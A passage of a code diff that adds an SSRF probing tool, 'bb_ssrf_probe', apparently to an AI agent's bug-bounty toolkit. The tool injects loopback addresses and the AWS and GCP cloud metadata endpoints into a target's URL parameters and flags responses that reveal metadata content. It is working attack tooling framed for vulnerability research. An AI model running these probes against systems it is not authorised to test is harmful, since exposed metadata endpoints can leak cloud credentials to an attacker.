+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: {
+				url: { type: "string", description: "Full URL with at least one param that feeds a backend fetch, e.g. https://target.com/fetch?url=https://example.com" },
+				param: { type: "string", description: "Optional: only test this param (default: all query params)" }
+			},
+			required: ["url"]
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					url: { type: "string" },
+					results: { type: "array", items: { type: "object", additionalProperties: false, properties: { param: { type: "string" }, probe: { type: "string" }, status: { type: "integer" }, baseline_status: { type: "integer" }, body_marker: { type: "string" }, note: { type: "string" } }, required: ["param", "probe", "status", "baseline_status"] } },
+					summary: { type: "string" },
+					error: { type: "string" }
+				},
+				required: ["url", "results", "summary"]
+			},
+			render: (_args, v) =>
+				renderLines("🌐 bb_ssrf_probe " + v.url, [
+					v.summary,
+					...v.results.filter((r) => r.status !== 0).map((r) => `${r.param} <- ${r.probe}: baseline ${r.baseline_status} vs ${r.status}${r.body_marker ? " [IMDS: " + r.body_marker + "]" : ""}${r.note ? " " + r.note : ""}`),
+					v.error ? "error: " + v.error : ""
+				].filter(Boolean))
+		},
+		timeoutMs: 60000,
+		isConcurrencySafe: () => true,
+		async execute(args, exec) {
+			const base = normalizeUrl(args.url);
+			const out = { url: base, results: [], summary: "", error: "" };
+			try {
+				const u = new URL(base);
+				const allParams = [...u.searchParams.keys()];
+				if (!allParams.length) { out.summary = "no query params to test — the fetch-feeding param must be in the URL"; return out; }
+				const wanted = args.param ? String(args.param) : "";
+				const params = allParams.filter((k) => !wanted || k === wanted);
+				const TARGETS = [
+					["http://127.0.0.1/", "loopback-ipv4"],
+					["http://localhost/", "loopback-host"],
+					["http://169.254.169.254/latest/meta-data/", "aws-imds"],
+					["http://metadata.google.internal/computeMetadata/v1/", "gcp-imds"],
+				];
+				const fetchWith = async (p, val) => {
+					const inj = new URL(u.toString());
+					inj.searchParams.set(p, val);
+					const b = withBudget(exec, 8000);
+					try {
+						const r = await fetch(inj.toString(), { method: "GET", signal: b.signal, redirect: "follow", headers: { "user-agent": UA } });
+						const txt = await readLimited(r, 4000);
+						return { status: r.status, txt };
+					} catch (e) {
+						return { status: 0, txt: (e && e.message) || "" };
+					} finally {
+						b.dispose();
+					}
+				};
+				for (const p of params) {
+					const origVal = u.searchParams.get(p) || "";
+					const baseResp = await fetchWith(p, origVal || "https://example.com/");
+					for (const [url, kind] of TARGETS) {
+						const r = await fetchWith(p, url);
+						const isImds = /ami-id|instance-id|computeMetadata|meta-data|dynamic\/instance/i.test(r.txt);
+						let note = "";
+						if (isImds) note = "IMDS CONTENT RETURNED — cloud metadata readable, critical SSRF";
+						else if (r.status !== 0 && baseResp.status !== 0 && r.status !== baseResp.status) note = "status diff vs baseline (" + baseResp.status + " -> " + r.status + ")";
+						else if (r.status === 0 && baseResp.status !== 0) note = "request failed while baseline worked — possible outbound fetch/connect attempt";
+						else if (r.status !== 0 && baseResp.status !== 0 && Math.abs(r.txt.length - baseResp.txt.length) > 250 && /refused|timed? ?out|no route/i.test(r.txt)) note = "server-side connection error leak (" + r.txt.slice(0, 60) + ")";
+						out.results.push({ param: p, probe: kind + " " + url, status: r.status, baseline_status: baseResp.status, body_marker: isImds ? "imds" : "", note });
+					}
+				}
+				const hits = out.results.filter((r) => r.note);
+				out.summary = hits.length
+					? hits.length + " probe(s) showed fetch behavior (" + hits.map((r) => r.param + ":" + r.probe.split(" ")[0]).join(", ") + ") — confirm with an OAST/collab listener before reporting; IMDS hits are critical"
+					: "no intra-request fetch signal on " + params.length + " param(s) — endpoint may sanitize URLs or fetch without observable diff; re-test with an OAST listener and protocol-relative // + encoded variants";
+			} catch (e) {
+				out.error = shortErr(e);
+			}
+			return out;
+		}
 	}
-];
+]
+
 
 const GUIDANCE = [
 	"BUG BOUNTY RECON & FINDING TOOLKIT (dsh-bugbounty, keyless sources):",
